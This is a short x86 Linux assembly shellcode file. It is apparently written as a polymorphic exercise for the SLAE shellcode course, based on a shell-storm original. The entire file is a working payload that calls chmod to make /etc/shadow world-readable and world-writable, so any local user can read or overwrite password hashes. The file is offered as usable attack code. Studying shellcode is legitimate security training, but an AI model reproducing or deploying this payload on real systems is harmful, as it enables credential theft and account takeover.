; linux/x86 chmod 666 /etc/shadow 27 bytes
; original: http://shell-storm.org/shellcode/files/shellcode-566.php, polymorphic for SLAE
 
section .text
        global _start
 
_start:
        ; chmod("//etc/shadow", 0666);
	push byte 15
        pop eax
        xor edx,edx
        push edx
	mov dword [esp-4],0x776f6461
	mov dword [esp-8],0x68732f63
	mov dword [esp-12],0x74652f2f
	sub esp,12
        mov ebx,esp
	mov cx,0666o
        int 0x80

